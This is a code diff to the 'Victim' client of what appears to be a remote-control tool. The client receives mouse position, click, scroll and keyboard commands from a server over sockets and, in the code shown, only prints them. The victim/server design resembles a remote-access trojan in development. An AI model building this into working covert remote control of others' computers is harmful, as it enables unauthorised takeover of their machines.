@@ -1,6 +1,7 @@
 #include "victim.hpp"
 #include <thread>
 #include <iostream>
+#include <SFML/Window.hpp>
 #include "../commands.hpp"
 
 Victim::Victim(std::string inHId)
@@ -25,7 +26,7 @@ int Victim::runVictimProcess()
 		}
 		if (status != sf::Socket::Status::Done)
 			continue;
-
+ 
 		uint16_t reqId = 0;
 		uint8_t cmd;
 		p >> reqId >> cmd;
@@ -50,15 +51,48 @@ int Victim::runVictimProcess()
 			std::string resStr = "received and processed #" + data + "#\n";
 			sf::Packet res;
 			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << resStr;
-			server.send(res);
+			auto _ = server.send(res);
 		}
 		//receive mouse position data
-		else if (cmd == uint8_t(Cmd::SSH_MOUSE)) {
-			std::cout << "code " << int(cmd) << ": mouse data\n";
+		else if (cmd == uint8_t(Cmd::SSH_MOUSE_POS)) {
+			uint16_t rx, ry;
+			p >> rx >> ry;
+
+			auto size = sf::VideoMode::getDesktopMode().size;
+			int x = std::round((rx * size.x) / float(UINT16_MAX - 1));
+			int y = std::round((ry * size.y) / float(UINT16_MAX - 1));
+
+			std::cout << "mouse " << x << ", " << y << "\n";
 		}
-		//receive keyboard state data
-		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD)) {
-			std::cout << "code " << int(cmd) << ": keyboard data\n";
+		else if (cmd == uint8_t(Cmd::SSH_MOUSE_PRESS)) {
+			uint8_t i;
+			p >> i;
+
+			std::cout << "mouse press: " << int(i) << "\n";
+		}
+		else if (cmd == uint8_t(Cmd::SSH_MOUSE_RELEASE)) {
+			uint8_t i;
+			p >> i;
+
+			std::cout << "mouse release: " << int(i) << "\n";
+		}
+		else if (cmd == uint8_t(Cmd::SSH_MOUSE_SCROLL)) {
+			int16_t delta;
+			p >> delta;
+
+			std::cout << "mouse scroll: " << delta << "\n";
+		}
+		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_PRESS)) {
+			uint8_t i;
+			p >> i; 
+			
+			std::cout << "keyboard press: " << int(i) << "\n";
+		}
+		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_RELEASE)) {
+			uint8_t i;
+			p >> i;
+
+			std::cout << "keyboard release: " << int(i) << "\n";
 		}
 		//unknown command
 		else {
